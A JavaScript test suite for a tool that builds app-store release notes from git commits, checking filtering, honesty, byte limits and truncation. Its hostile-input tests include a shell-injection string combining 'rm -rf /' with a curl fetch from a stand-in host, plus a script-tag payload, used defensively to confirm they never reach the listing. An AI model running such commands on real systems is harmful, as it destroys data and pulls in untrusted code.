import { describe, expect, it } from "vitest";
import { execFileSync, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

import {
  GENERIC_NOTE,
  MAINTENANCE_NOTE,
  MAX_NOTES,
  MAX_TOTAL_BYTES,
  MIN_TOTAL_BYTES,
  PAD_NOTE,
  THEMES,
  buildNotes,
  byteLength,
  classify,
  derivedNotes,
  parseCommitRecords,
  parseTrailers,
  sanitizeLine,
  truncateToBytes,
} from "../release-notes.mjs";

const CLI = fileURLToPath(new URL("../../release-notes.mjs", import.meta.url));

/** A commit as the generator sees one. */
const c = (subject, body = "") => ({ subject, body });

/** What the store would actually receive. */
const notes = (commits, authoredFile = null) => buildNotes({ commits, authoredFile }).text;

/** Every path must land inside the window android-build.yml hard-fails outside of. */
const expectStoreSafe = (text) => {
  const bytes = byteLength(text);
  expect(bytes).toBeGreaterThanOrEqual(MIN_TOTAL_BYTES);
  expect(bytes).toBeLessThanOrEqual(MAX_TOTAL_BYTES);
  expect(text.endsWith("\n")).toBe(true);
  expect(text.trim()).not.toBe("");
};

// ─────────────────────────────────────────────────────────────────────────────
// The three releases that actually shipped, and the sentences customers read.
//
// These are the exact subjects recovered from CI runs 32581366866, 32544188002
// and 32426136588. Every one of them PASSED the old bash filters and was
// published verbatim to the Play production listing. That is the whole defect,
// so it is the first thing tested.
// ─────────────────────────────────────────────────────────────────────────────

const RELEASE_6_4_0 = [
  c("docs(handoff): the 21c follow-ups are closed and the release path has a caller"),
  c("feat(release): give the VERSION classifier a caller, and make staleness loud"),
  c("docs(comments): three comments that asserted things the code does not do"),
  c("fix(month0-drawer): the $2 above the floor is the cushion, not surplus the cards could not absorb"),
  c("docs(handoff): the month-0 knife edge is closed, and the cash-floor thread with it"),
  c("fix(cash-floor): month 0 gets the same $2 cushion as every other month"),
  c("docs(handoff): there was no month-0 breach, and the patch that found one was measuring itself"),
  c("chore(version): 6.3.0 -> 6.4.0, so the iOS upload has a train to land in"),
  c("fix(forecast): one floor, judged in cents, in one place"),
];

const RELEASE_FLOOR_AND_PLAID = [
  c("docs(handoff): the engine breach mechanism, and confirmation that the cliff is Tre's own data"),
  c("docs(handoff): the below-floor months are real, and the summary that hid them has a real bug behind it"),
  c("docs(forecast): pin down why the summary and the rows disagree, without half-fixing it"),
  c("docs(handoff): manual users get the committed term, a double-count caught by an invariant, one thread open"),
  c("fix(cash-floor): manual users get the committed term too, and the vehicle loan comes back out of it"),
  c("docs(handoff): the automatic floor is fixed, and now beats the manual one it replaced"),
  c("fix(cash-floor): the automatic floor is now a real per-month figure, and stops projecting negative"),
  c("docs(handoff): root-cause of the regression — two faults, and the A/B that separates them"),
  c("docs(handoff): four features shipped, and two edge functions that are committed but not deployed"),
  c("feat(cash-floor): the floor can be calculated automatically each month, and now is by default"),
  c("feat(marketing): /calendar/ — a home on our own domain for the bill-calendar lead magnet"),
  c("feat(plaid): re-linking a bank now supersedes the old connection to it, automatically"),
  c("feat(accounts): a user may rename a linked account, and the sync will not take it back"),
];

const RELEASE_CONSOLIDATION = [
  c("docs(handoff): the Sep-2027 income cliff does not exist; fork resolved"),
  c("docs(handoff): consolidation surface shipped; income toggle is the next slice"),
  c("feat(debt): surface the no-loan paydown plan on Credit Card Payoff"),
  c("feat(consolidation): read the real cards and plans, and price the no-loan plan"),
  c("docs(handoff): Discover denial, self-funded paydown plan, Venture X pushed to Apr 2027"),
  c("docs(handoff): re-run loan analysis on guaranteed income only; mom payback moved to Mar 2027"),
  c("docs(handoff): consolidation engine shipped; loan answer delivered; surface still to build"),
  c("feat(consolidation): price a personal loan against the cards, the constraints, and the charges still coming"),
];

describe("the three releases that actually shipped to the Play listing", () => {
  it("6.4.0 no longer publishes the $2 cushion sentence", () => {
    const text = notes(RELEASE_6_4_0);
    expect(text).toBe("- Improvements to your cash flow forecast.\n");
    // The exact bytes that are live on the store right now, gone.
    expect(text).not.toContain("cushion");
    expect(text).not.toContain("$2");
    expect(text).not.toContain("judged in cents");
    expectStoreSafe(text);
  });

  it("the cash-floor and Plaid release names three areas a customer recognises", () => {
    const text = notes(RELEASE_FLOOR_AND_PLAID);
    expect(text).toBe(
      [
        "- Improvements to your cash flow forecast.",
        "- Improvements to linking and syncing your bank accounts.",
        "- Improvements to your accounts and balances.",
        "",
      ].join("\n"),
    );
    // The marketing commit is internal work; it never reaches the store.
    expect(text).not.toContain("calendar");
    expectStoreSafe(text);
  });

  it("the consolidation release says credit card payoff, not 'price the no-loan plan'", () => {
    const text = notes(RELEASE_CONSOLIDATION);
    expect(text).toBe("- Improvements to your credit card payoff plan.\n");
    expect(text).not.toContain("no-loan");
    expectStoreSafe(text);
  });

  it("no commit subject from any of the three is ever echoed", () => {
    // The structural guarantee: the derived path emits sentences THIS REPO wrote,
    // never sentences an engineer wrote. Proven by taking every distinctive word
    // from the real subjects and asserting none survives.
    const all = [...RELEASE_6_4_0, ...RELEASE_FLOOR_AND_PLAID, ...RELEASE_CONSOLIDATION];
    const text = all.map((x) => notes([x])).join("\n");
    for (const word of [
      "cushion", "surplus", "absorb", "knife", "supersedes", "committed term",
      "per-month figure", "no-loan", "paydown", "constraints", "lead magnet",
    ]) {
      expect(text).not.toContain(word);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// The authored override — the primary path.
// ─────────────────────────────────────────────────────────────────────────────

describe("a Release-Note: trailer, written by a person", () => {
  it("is published verbatim and beats anything derived", () => {
    const text = notes([
      c(
        "fix(cash-floor): month 0 gets the same $2 cushion as every other month",
        "Release-Note: Your first forecast month now keeps the same safety cushion as every month after it.",
      ),
    ]);
    expect(text).toBe(
      "- Your first forecast month now keeps the same safety cushion as every month after it.\n",
    );
    expectStoreSafe(text);
  });

  it("several commits each contribute one line, newest first", () => {
    const text = notes([
      c("feat(plaid): re-linking a bank supersedes the old connection", "Release-Note: Reconnecting a bank no longer leaves a duplicate behind."),
      c("feat(accounts): a user may rename a linked account", "Release-Note: Rename any linked account and the name sticks."),
    ]);
    expect(text).toBe(
      [
        "- Reconnecting a bank no longer leaves a duplicate behind.",
        "- Rename any linked account and the name sticks.",
        "",
      ].join("\n"),
    );
  });

  it("one authored line suppresses the derived themes entirely, on purpose", () => {
    // Otherwise the person who took the trouble to write the wording gets it
    // padded out with generic sentences they did not ask for.
    const text = notes([
      c("feat(debt): surface the no-loan paydown plan", "Release-Note: See your payoff plan without taking a loan."),
      c("fix(forecast): one floor, judged in cents, in one place"),
    ]);
    expect(text).toBe("- See your payoff plan without taking a loan.\n");
  });

  it("is matched case-insensitively and tolerates a bullet the author typed", () => {
    expect(notes([c("feat(goals): x", "release-note:  - Savings goals now round to the dollar.")])).toBe(
      "- Savings goals now round to the dollar.\n",
    );
  });

  it("'Release-Note: none' contributes nothing, and lets the derived path run", () => {
    const text = notes([c("fix(forecast): one floor, judged in cents, in one place", "Release-Note: none")]);
    expect(text).toBe("- Improvements to your cash flow forecast.\n");
  });

  it("ignores duplicates so a cherry-pick does not print the line twice", () => {
    const text = notes([
      c("fix(a): x", "Release-Note: Bills now show the day they are due."),
      c("fix(b): y", "Release-Note: bills NOW show the day they are due."),
    ]);
    expect(text).toBe("- Bills now show the day they are due.\n");
  });

  it("publishes an authored line even for a commit type the filter would reject", () => {
    // The author outranks the classifier. A `chore:` that a person says is worth
    // announcing is worth announcing.
    const text = notes([c("chore(release): 6.4.0 -> 6.5.0", "Release-Note: Forgenta is now available on iPad.")]);
    expect(text).toBe("- Forgenta is now available on iPad.\n");
  });
});

describe("the hand-written whole-release file", () => {
  it("wins over both trailers and themes when it is in play", () => {
    const text = notes(
      [c("fix(forecast): one floor", "Release-Note: A trailer that should lose.")],
      "We rebuilt the forecast from the ground up.\nEverything is faster.\n",
    );
    expect(text).toBe(
      ["- We rebuilt the forecast from the ground up.", "- Everything is faster.", ""].join("\n"),
    );
  });

  it("a blank file is not an override, it is nothing", () => {
    expect(notes([c("fix(forecast): one floor, judged in cents")], "\n  \n")).toBe(
      "- Improvements to your cash flow forecast.\n",
    );
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// The filter. Much more suspicious than the old one, deliberately.
// ─────────────────────────────────────────────────────────────────────────────

describe("what is allowed to influence the listing at all", () => {
  it("only feat, fix and perf are public types", () => {
    expect(classify("feat(goals): add a goal")).toBeTruthy();
    expect(classify("fix(goals): fix a goal")).toBeTruthy();
    expect(classify("perf(app): faster startup")).toBe("perf");
    for (const s of ["chore: x", "docs: x", "refactor: x", "style: x", "test: x", "revert: x", "wip"]) {
      expect(classify(s)).toBeNull();
    }
  });

  it("a subject with no conventional prefix is internal by default", () => {
    expect(classify("Merge pull request #111 from redesign/integration")).toBeNull();
    expect(classify("update the budget page")).toBeNull();
  });

  it("internal scopes never reach a customer", () => {
    for (const scope of ["ci", "deps", "marketing", "reddit-scout", "release", "docs", "security"]) {
      expect(classify(`feat(${scope}): something genuinely good`)).toBeNull();
    }
  });

  it("rejects engineering vocabulary even under a clean feat/fix prefix", () => {
    for (const s of [
      "fix(forecast): recapture the fixture after the ISB change",
      "fix(budget): the eslint rule was hiding a real bug",
      "feat(accounts): extract the balance helper into its own module",
      "fix(goals): add a regression test for the rounding",
      "fix(bills): the cron job ran four days a week, not daily",
      "feat(auth): rotate the api key and redeploy the edge function",
      "perf(app): drop 25 unused dependencies from the bundle",
    ]) {
      expect(classify(s), s).toBeNull();
    }
  });

  it("rejects subjects that read like code rather than English", () => {
    for (const s of [
      "fix(forecast): src/lib/net-worth.ts double-counts the loan",
      "fix(budget): getCarFundSaved returns the wrong sign",
      "fix(goals): monthly_target was never read",
      "fix(app): revert 3c71b3c2, it broke utilization",
      "feat(accounts): call resolveBalance() before rendering",
    ]) {
      expect(classify(s), s).toBeNull();
    }
  });

  it("a public commit in an area with no theme still says SOMETHING true", () => {
    expect(derivedNotes([c("fix(printer): the thing that has no theme here")])).toEqual([GENERIC_NOTE]);
  });

  it("every theme's canned sentence is what gets published, and it is short", () => {
    for (const theme of THEMES) {
      expect(theme.note.length).toBeLessThan(80);
      expect(theme.note.endsWith(".")).toBe(true);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Honesty.
// ─────────────────────────────────────────────────────────────────────────────

describe("a release with nothing user-visible in it", () => {
  it("says so, rather than inventing performance improvements nobody made", () => {
    const text = notes([
      c("docs(handoff): session 41"),
      c("chore(version): 6.4.0 -> 6.5.0"),
      c("refactor(forecast): extract the floor loop"),
    ]);
    expect(text).toBe(`${MAINTENANCE_NOTE}\n`);
    expect(text).not.toMatch(/performance improvements|stability fixes|new features/i);
    expectStoreSafe(text);
  });

  it("an empty range still produces a legal, honest note", () => {
    const text = notes([]);
    expect(text).toBe(`${MAINTENANCE_NOTE}\n`);
    expectStoreSafe(text);
  });

  it("never publishes an empty string, whatever it is handed", () => {
    for (const input of [[], [c("")], [c("   ")], [c("chore: x")], [c("feat(ci): x")]]) {
      expectStoreSafe(notes(input));
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// The store boundary: 20..500 bytes or the production deploy fails.
// ─────────────────────────────────────────────────────────────────────────────

describe("the 20..500 byte window android-build.yml enforces", () => {
  it("caps the number of lines", () => {
    const many = THEMES.map((t) => c(`feat(${t.scopes[0]}): a real user facing change here`));
    const text = notes(many);
    expect(text.trim().split("\n").length).toBeLessThanOrEqual(MAX_NOTES);
    expectStoreSafe(text);
  });

  it("holds for an enormous authored release", () => {
    const commits = Array.from({ length: 200 }, (_, i) =>
      c(`feat(goals): change ${i}`, `Release-Note: ${"A very long authored sentence about goals ".repeat(3)}${i}.`),
    );
    expectStoreSafe(notes(commits));
  });

  it("holds for a single authored line far longer than the whole budget", () => {
    const text = notes([c("feat(goals): x", `Release-Note: ${"word ".repeat(400)}end.`)]);
    expectStoreSafe(text);
    expect(text).toMatch(/…\n$/);
    // Truncated on a word boundary, never mid-word.
    expect(text.replace(/…\n$/, "")).toMatch(/\bword$/);
  });

  it("counts BYTES, not characters, because the workflow measures with wc -c", () => {
    // 4 bytes per emoji. A 480-character budget would be a 1900-byte file.
    const text = notes([c("feat(goals): x", `Release-Note: ${"🎉".repeat(600)}`)]);
    expect(byteLength(text)).toBeLessThanOrEqual(MAX_TOTAL_BYTES);
    expectStoreSafe(text);
  });

  it("truncateToBytes never splits a UTF-8 code point", () => {
    for (let n = 5; n < 40; n += 1) {
      const cut = truncateToBytes("🎉".repeat(20), n);
      expect(byteLength(cut)).toBeLessThanOrEqual(n);
      expect(cut).not.toContain("�");
      expect([...cut].every((ch) => ch === "🎉" || ch === "…")).toBe(true);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Hostile input. Nothing here may reach the store, and nothing here may crash.
// ─────────────────────────────────────────────────────────────────────────────

describe("hostile commit subjects", () => {
  const HOSTILE = [
    ["a file path", "fix(forecast): src/lib/cycling-debt-engine.ts:1204 off by one"],
    ["a commit hash", "fix(app): revert a08eb34b and re-pin goldenTierA"],
    ["a dollar figure", "fix(month0-drawer): the $2 above the floor is the cushion, not surplus the cards could not absorb"],
    ["an emoji", "feat(goals): 🎉🎉🎉 ship the thing 🎉🎉🎉"],
    ["non-ASCII", "fix(budget): корректный расчёт бюджета — 予算の修正"],
    ["a breaking marker", "feat(accounts)!: drop the old balance field"],
    ["a very long subject", `fix(forecast): ${"an extremely long run-on commit subject ".repeat(40)}`],
    ["a shell injection attempt", "feat(goals): $(rm -rf /) && `curl evil.sh` ${IFS}"],
    ["markup", "fix(budget): <script>alert(1)</script> in the category name"],
    ["control characters", "feat(goals):\u0007 bell\u0000 nul\u001b[31m red"],
    ["nothing but punctuation", "fix(app): ---"],
  ];

  for (const [label, subject] of HOSTILE) {
    it(`${label} cannot put a byte into the listing`, () => {
      const text = notes([c(subject)]);
      expectStoreSafe(text);
      // Output is always one of the sentences this repo wrote.
      const legal = [...THEMES.map((t) => t.note), GENERIC_NOTE, MAINTENANCE_NOTE];
      for (const line of text.trim().split("\n")) {
        expect(legal).toContain(line.replace(/^- /, ""));
      }
    });
  }

  it("a hostile AUTHORED line is sanitised rather than trusted", () => {
    const text = notes([c("feat(goals): x", "Release-Note: line one\u0000\u001b[31m\ttwo   three")]);
    expect(text).toBe("- line one two three\n");
    // The trailing newline is the only control character allowed to survive.
    expect(text).not.toMatch(/[\u0000-\u0009\u000b-\u001f]/);
    expectStoreSafe(text);
  });

  // MEASURED, not assumed. Round 1's report claimed all three of these "fall
  // through to the maintenance line". They do not, and the test that only
  // asserted store-safety could not tell. Each one is now pinned to the exact
  // bytes it really produces.
  //
  // The real behaviour, and why it is right: an empty description carries no
  // evidence, so it can never pick a THEME from words it does not have. What
  // survives is the type the author typed. `feat:` and `fix():` land on the
  // honest generic line; `perf(  ):` keeps the perf theme, because `perf` is
  // itself the author's statement about the change and the theme sentence is a
  // hedge ("Improvements to app performance.") rather than a measurement.
  // Nothing here can echo a subject, because there is no subject to echo.
  it("a subject that is only a conventional prefix keeps its type and loses its theme", () => {
    expect(classify("feat:")).toBe("general");
    expect(classify("fix():")).toBe("general");
    expect(classify("perf(  ):")).toBe("perf");

    expect(notes([c("feat:")])).toBe(`- ${GENERIC_NOTE}\n`);
    expect(notes([c("fix():")])).toBe(`- ${GENERIC_NOTE}\n`);
    expect(notes([c("perf(  ):")])).toBe("- Improvements to app performance.\n");

    // Together, the perf theme is the only one with anything to say.
    expect(notes([c("feat:"), c("fix():"), c("perf(  ):")])).toBe(
      "- Improvements to app performance.\n",
    );

    for (const s of ["feat:", "fix():", "perf(  ):"]) expectStoreSafe(notes([c(s)]));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Plumbing.
// ─────────────────────────────────────────────────────────────────────────────

describe("reading git log output", () => {
  it("parses the record format the CLI asks git for", () => {
    const raw = "abc\u001ffeat(goals): x\u001fRelease-Note: Y\n\u001edef\u001ffix(budget): z\u001f\u001e";
    expect(parseCommitRecords(raw)).toEqual([
      { sha: "abc", subject: "feat(goals): x", body: "Release-Note: Y\n" },
      { sha: "def", subject: "fix(budget): z", body: "" },
    ]);
  });

  it("still accepts a plain list of subjects, for `git log --format=%s | ... --stdin`", () => {
    expect(parseCommitRecords("feat(goals): x\n\nfix(budget): z\n")).toEqual([
      { sha: "", subject: "feat(goals): x", body: "" },
      { sha: "", subject: "fix(budget): z", body: "" },
    ]);
  });

  it("an empty log is an empty list, not a crash", () => {
    for (const raw of ["", "   \n", null, undefined]) expect(parseCommitRecords(raw)).toEqual([]);
  });

  it("sanitizeLine flattens anything a commit body can carry", () => {
    expect(sanitizeLine("  • a   b \n c ")).toBe("a b c");
    expect(sanitizeLine("")).toBe("");
    expect(sanitizeLine(null)).toBe("");
  });
});

// Every test that spawns the CLI gets this instead of vitest's 5000ms default: booting a second
// node and shelling out to git takes far longer under a full-suite run than it does in isolation,
// which is what made this file flake red on the first run and green on the rerun.
const SUBPROCESS_TIMEOUT_MS = 20_000;

describe("the CLI, run for real against this repository", () => {
  const run = (...args) =>
    execFileSync(process.execPath, [CLI, ...args], { encoding: "utf8", maxBuffer: 4 * 1024 * 1024 });

  it("produces a store-safe note for the default range", () => {
    expectStoreSafe(run());
  }, SUBPROCESS_TIMEOUT_MS);

  it("produces a store-safe note for a range with no commits in it", () => {
    expectStoreSafe(run("HEAD..HEAD"));
  }, SUBPROCESS_TIMEOUT_MS);

  it("survives a range that does not exist, rather than failing the deploy", () => {
    expectStoreSafe(run("deadbeefdeadbeef..HEAD"));
  }, SUBPROCESS_TIMEOUT_MS);

  it("reads subjects from stdin", () => {
    const out = execFileSync(process.execPath, [CLI, "--stdin"], {
      input: "feat(plaid): re-linking a bank now supersedes the old connection to it\n",
      encoding: "utf8",
    });
    expect(out).toBe("- Improvements to linking and syncing your bank accounts.\n");
  }, SUBPROCESS_TIMEOUT_MS);
});

// ─────────────────────────────────────────────────────────────────────────────
// ROUND-2 FIXES. Each block below is the proof for one review finding, and its
// header names the finding, so a later reader can tell what would break.
// ─────────────────────────────────────────────────────────────────────────────

// BLOCKER 1: the worked example in docs/release-notes-template.md was wrapped
// across two lines while the parser read one, so the documented example for the
// primary path published half a sentence and dropped the rest in silence.
describe("a trailer that wraps onto a second line", () => {
  const WRAPPED_BODY =
    "Release-Note: Your first forecast month keeps the same safety cushion\nas every month after it.";

  it("is not silently truncated: the drop is reported, loudly", () => {
    const built = buildNotes({ commits: [c("fix(cash-floor): month 0", WRAPPED_BODY)] });
    expect(built.warnings).toHaveLength(1);
    expect(built.warnings[0]).toContain("looks wrapped");
    // It names both halves, so the author can see exactly what was lost.
    expect(built.warnings[0]).toContain("as every month after it.");
    expect(built.warnings[0]).toContain("docs/release-notes-template.md");
    // Git reads a trailer as one line, so the published half is still the
    // published half. The point is that nobody has to guess that it happened.
    expect(built.text).toBe("- Your first forecast month keeps the same safety cushion\n");
    expectStoreSafe(built.text);
  });

  it("an indented continuation is folded in, the way git folds a trailer", () => {
    const text = notes([
      c(
        "fix(cash-floor): month 0",
        "Release-Note: Your first forecast month keeps the same safety cushion\n  as every month after it.",
      ),
    ]);
    expect(text).toBe(
      "- Your first forecast month keeps the same safety cushion as every month after it.\n",
    );
    // Tab-indented continuations fold too. The pad line below is MAJOR 5's
    // rule doing its job: 8 bytes of authored note is under the 20-byte
    // minimum, so it is padded rather than replaced.
    expect(buildNotes({ commits: [c("x", "Release-Note: a\n\tb\n\tc")] }).text).toBe(
      `- a b c\n- ${PAD_NOTE}\n`,
    );
  });

  it("does not cry wolf on an ordinary body", () => {
    // A finished sentence followed by another trailer, or by a new paragraph
    // that starts like a sentence, is not a wrapped note.
    for (const body of [
      "Release-Note: Bills now show the day they are due.\nSigned-off-by: Tre <tre@treforged.com>",
      "Release-Note: Bills now show the day they are due.\n\nA paragraph after a blank line.",
      "Release-Note: Bills now show the day they are due.\nCloses #412",
      "Some body text first.\n\nRelease-Note: Bills now show the day they are due.",
    ]) {
      expect(buildNotes({ commits: [c("fix(bills): x", body)] }).warnings, body).toEqual([]);
    }
  });

  it("parseTrailers reports notes and warnings separately", () => {
    expect(parseTrailers("Release-Note: A finished sentence.")).toEqual({
      notes: ["A finished sentence."],
      warnings: [],
    });
    expect(parseTrailers(null)).toEqual({ notes: [], warnings: [] });
  });
});

// BLOCKER 2: the jargon filter word-anchored ordinary product English, so a real
// marquee feature was rejected and the release published MAINTENANCE_NOTE, which
// is a lie about a release that shipped a feature.
describe("ordinary product English is not engineering jargon", () => {
  const REAL_FEATURES = [
    ["export", "feat(transactions): export your transactions to a CSV file"],
    ["import", "feat(transactions): import a statement from your bank"],
    ["type", "feat(accounts): pick an account type when you add one"],
    ["policy", "feat(bills): track an insurance policy alongside your bills"],
    ["coverage", "feat(bills): add your insurance coverage to the cash floor"],
    ["upgrade", "feat(billing): upgrade to a yearly plan from the app"],
    ["merge", "feat(accounts): merge two accounts that are the same account"],
    ["log in", "feat(auth): log in with Face ID"],
    ["logs", "feat(budget): the app logs every purchase against its category"],
    ["snapshot", "feat(accounts): snapshot your net worth every month"],
    ["branch", "feat(accounts): show which branch your account belongs to"],
    ["unit", "feat(budget): choose the unit your goals are shown in"],
    ["interface", "feat(ui): a calmer interface on the dashboard"],
    ["comment", "feat(transactions): leave a comment on any transaction"],
    ["agent", "feat(bills): keep your insurance agent's number with the policy"],
  ];

  for (const [word, subject] of REAL_FEATURES) {
    it(`"${word}" is a word a customer reads happily, so it does not reject the commit`, () => {
      expect(classify(subject), subject).not.toBeNull();
      const text = notes([c(subject)]);
      expect(text, subject).not.toBe(`${MAINTENANCE_NOTE}\n`);
      expectStoreSafe(text);
    });
  }

  it("a release whose only feature uses one of those words is not called a maintenance release", () => {
    const text = notes([
      c("docs(handoff): session 42"),
      c("chore(version): 6.4.0 -> 6.5.0"),
      c("feat(transactions): export your transactions to a CSV file"),
    ]);
    expect(text).toBe("- Improvements to transactions and how they are matched.\n");
  });

  it("still rejects the vocabulary that is unambiguously internal", () => {
    for (const s of [
      "fix(forecast): recapture the fixture after the ISB change",
      "fix(budget): the eslint rule was hiding a real bug",
      "feat(accounts): move the balance helper into its own module",
      "fix(goals): add a regression test for the rounding",
      "fix(bills): the cron job ran four days a week, not daily",
      "feat(auth): rotate the api key and redeploy the edge function",
      "perf(app): drop 25 unused dependencies",
      "fix(forecast): re-pin the golden after the migration",
      "feat(goals): a claude-generated changelog for the readme",
    ]) {
      expect(classify(s), s).toBeNull();
    }
  });
});

// MAJOR 3: one theme published a privacy claim for scopes (settings, profile,
// billing, stripe, subscription) that have nothing to do with privacy.
describe("a privacy claim is made only where a commit supports one", () => {
  const privacyNote = THEMES.find((t) => t.id === "privacy").note;

  it("settings, profile, billing and subscription commits say what they actually did", () => {
    expect(notes([c("fix(settings): the units picker keeps your choice")])).toBe(
      "- Improvements to settings and your profile.\n",
    );
    expect(notes([c("feat(profile): show your initials in the header")])).toBe(
      "- Improvements to settings and your profile.\n",
    );
    expect(notes([c("feat(billing): a yearly plan at checkout")])).toBe(
      "- Improvements to plans, billing, and checkout.\n",
    );
    expect(notes([c("fix(stripe): the receipt shows the right total")])).toBe(
      "- Improvements to plans, billing, and checkout.\n",
    );
  });

  it("none of those five ever mention privacy", () => {
    for (const scope of ["settings", "profile", "billing", "stripe", "subscription"]) {
      const text = notes([c(`feat(${scope}): a real change here`)]);
      expect(text, scope).not.toContain("privacy");
      expect(text, scope).not.toContain("private");
      expect(text, scope).not.toBe(`- ${privacyNote}\n`);
    }
  });

  it("a privacy commit still gets a privacy sentence", () => {
    expect(notes([c("fix(privacy): balances stay hidden in the app switcher")])).toBe(
      `- ${privacyNote}\n`,
    );
  });

  it("signing in is its own claim, and it is only about signing in", () => {
    const text = notes([c("feat(auth): sign in with Face ID")]);
    expect(text).toBe("- Improvements to signing in and account setup.\n");
    expect(text).not.toContain("private");
  });
});

// MAJOR 4: one theme made a concrete, testable, unmeasured claim.
describe("no theme claims something nobody measured", () => {
  it("perf hedges like every other theme", () => {
    expect(notes([c("perf(app): trim the startup work")])).toBe(
      "- Improvements to app performance.\n",
    );
  });

  it("no theme sentence contains a measurable assertion", () => {
    for (const theme of THEMES) {
      expect(theme.note, theme.id).not.toMatch(
        /\b(faster|slower|less|more|fewer|\d+\s*(%|x|ms|mb|seconds?|times))\b/i,
      );
    }
  });
});

// MAJOR 5: a short authored note was silently replaced by MAINTENANCE_NOTE, so
// the store published the opposite of what the author wrote.
describe("a short authored note is never replaced by the maintenance line", () => {
  it("keeps the author's words and pads underneath them", () => {
    const built = buildNotes({
      commits: [c("feat(goals): x", "Release-Note: Now on iPad.")],
    });
    expect(built.text.startsWith("- Now on iPad.\n")).toBe(true);
    expect(built.text).not.toContain(MAINTENANCE_NOTE);
    expect(built.source).toBe("authored+padded");
    expectStoreSafe(built.text);
  });

  it("pads with a theme genuinely derived from the same range when there is one", () => {
    expect(notes([c("fix(forecast): one floor, in one place", "Release-Note: Now on iPad.")])).toBe(
      "- Now on iPad.\n- Improvements to your cash flow forecast.\n",
    );
  });

  it("pads with a sentence that claims nothing when there is no theme to use", () => {
    expect(notes([c("chore(version): 6.4.0 -> 6.5.0", "Release-Note: Hi.")])).toBe(
      `- Hi.\n- ${PAD_NOTE}\n`,
    );
  });

  it("holds for the hand-written file too, which is also a person's words", () => {
    const built = buildNotes({ commits: [c("chore: x")], authoredFile: "Now on iPad.\n" });
    expect(built.text.startsWith("- Now on iPad.\n")).toBe(true);
    expect(built.text).not.toContain(MAINTENANCE_NOTE);
    expectStoreSafe(built.text);
  });

  it("even a one-character note survives to the store", () => {
    for (const value of ["a", "New!", "iPad.", "Now on iPad."]) {
      const built = buildNotes({ commits: [c("feat(goals): x", `Release-Note: ${value}`)] });
      expect(built.text.startsWith(`- ${value}\n`), value).toBe(true);
      expectStoreSafe(built.text);
    }
  });
});

// MINOR 7: an em dash reached a store listing. Tre's standing preference.
describe("no em dash reaches a customer", () => {
  it("holds for every sentence this module can publish", () => {
    for (const line of [...THEMES.map((t) => t.note), GENERIC_NOTE, MAINTENANCE_NOTE, PAD_NOTE]) {
      expect(line, line).not.toContain("—");
      expect(line, line).not.toContain("–");
    }
  });

  it("holds for the maintenance release a customer actually sees", () => {
    expect(notes([])).not.toContain("—");
  });
});

// NIT 10: truncation was quadratic, so one long line made a store deploy slow.
describe("truncation is linear in the length of the line", () => {
  it("cuts a 400k-character line correctly, and fast enough to prove it is not quadratic", () => {
    const huge = "word ".repeat(80_000);
    const started = Date.now();
    const cut = truncateToBytes(huge, 200);
    const elapsed = Date.now() - started;
    expect(byteLength(cut)).toBeLessThanOrEqual(200);
    expect(cut.endsWith("…")).toBe(true);
    // The old implementation re-joined and re-measured the whole string on every
    // popped code point. At this size that is billions of byte-length calls.
    expect(elapsed).toBeLessThan(2_000);
  }, 10_000);

  it("a 400k-byte authored note still produces a store-safe listing", () => {
    const built = buildNotes({
      commits: [c("feat(goals): x", `Release-Note: ${"word ".repeat(80_000)}end.`)],
    });
    expectStoreSafe(built.text);
  }, 10_000);
});

// NIT 11: process.exit(0) straight after a stdout write can truncate on a pipe,
// which is exactly how the iOS step captures it (`NOTE=$(node ...)`).
describe("stdout is never truncated when it is a pipe", () => {
  it("delivers the whole note through a captured pipe, every time", () => {
    // The widest output the generator produces, through --stdin. Repeated because
    // a truncating write is a race, and a race that fails one run in ten fails a
    // release one run in ten.
    const subjects = Array.from(
      { length: 200 },
      (_, i) => `feat(${THEMES[i % THEMES.length].scopes[0]}): a real user facing change ${i}\n`,
    ).join("");

    for (let attempt = 0; attempt < 10; attempt += 1) {
      const proc = spawnSync(process.execPath, [CLI, "--stdin", "--why"], {
        input: subjects,
        encoding: "utf8",
        maxBuffer: 4 * 1024 * 1024,
      });
      expect(proc.status).toBe(0);
      expectStoreSafe(proc.stdout);
      // --why prints the byte count it INTENDED to write; stdout must match it.
      const claimed = /bytes=(\d+)/.exec(proc.stderr);
      expect(claimed, proc.stderr).not.toBeNull();
      expect(byteLength(proc.stdout)).toBe(Number(claimed[1]));
    }
  }, 30_000);

  it("a warning goes to stderr and never into the captured note", () => {
    const proc = spawnSync(process.execPath, [CLI, "HEAD..HEAD"], { encoding: "utf8" });
    expect(proc.status).toBe(0);
    expect(proc.stdout).not.toContain("release-notes:");
    expectStoreSafe(proc.stdout);
  }, SUBPROCESS_TIMEOUT_MS);
});
